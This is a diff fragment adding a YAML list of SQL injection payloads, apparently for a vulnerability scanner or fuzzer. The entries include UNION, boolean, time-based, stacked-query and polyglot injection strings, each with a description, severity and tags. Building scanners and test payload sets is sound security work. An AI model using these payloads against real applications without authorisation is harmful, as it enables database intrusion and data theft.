+    - value: "' UNION SELECT NULL,NULL,NULL--"
+      description: "Generic UNION NULLs"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "' AND 1=1--"
+      description: "Generic AND true"
+      severity: medium
+      tags: [boolean, polyglot]
+
+    - value: "' AND 1=2--"
+      description: "Generic AND false"
+      severity: medium
+      tags: [boolean, polyglot]
+
+    - value: "' WAITFOR DELAY '0:0:5'--"
+      description: "Generic WAITFOR time-based"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "' OR SLEEP(5)--"
+      description: "Generic SLEEP time-based"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "' OR pg_sleep(5)--"
+      description: "Generic pg_sleep time-based"
+      severity: high
+      tags: [time_based, polyglot]
+
+    # Polyglot payloads (work across multiple DBMS)
+    - value: "' OR 1='1"
+      description: "Polyglot OR tautology v1"
+      severity: high
+      tags: [polyglot]
+
+    - value: "1' OR '1'='1' /*"
+      description: "Polyglot OR with comment"
+      severity: high
+      tags: [polyglot]
+
+    - value: "' /*!50000OR*/ 1=1--"
+      description: "MySQL comment polyglot"
+      severity: high
+      tags: [polyglot, mysql_comment]
+
+    - value: "' OR 1=1;%00"
+      description: "Null byte polyglot"
+      severity: high
+      tags: [polyglot, null_byte]
+
+    - value: "-1' UNION SELECT 1,2,3--"
+      description: "Negative ID UNION"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "0 UNION SELECT 1,2,3--"
+      description: "Zero ID UNION"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "1;SELECT 1,2,3--"
+      description: "Semicolon stacked query"
+      severity: high
+      tags: [stacked, polyglot]
+
+    - value: "' OR 'x'='x"
+      description: "OR with x tautology"
+      severity: high
+      tags: [polyglot]
+
+    - value: "1 AND 1=1 UNION SELECT 1,2,3--"
+      description: "Boolean + UNION combo"
+      severity: high
+      tags: [union, boolean, polyglot]
+
+    - value: "')) OR 1=1--"
+      description: "Double parenthesis OR"
+      severity: high
+      tags: [polyglot, parenthesis]
+
+    - value: "' OR ''='"
+      description: "Empty string polyglot"
+      severity: high
+      tags: [polyglot]
+
+    - value: "' OR 1 LIKE 1--"
+      description: "LIKE tautology"
+      severity: high
+      tags: [polyglot]
+
+    - value: "' OR 'abc' LIKE 'ab%'--"
+      description: "LIKE wildcard"
+      severity: medium
+      tags: [polyglot]
+
+    - value: "1'||'1'='1"
+      description: "Concatenation OR"
+      severity: high
+      tags: [polyglot, concatenation]
+
+    - value: "' OR 1 BETWEEN 0 AND 2--"
+      description: "BETWEEN tautology"
+      severity: high
+      tags: [polyglot]
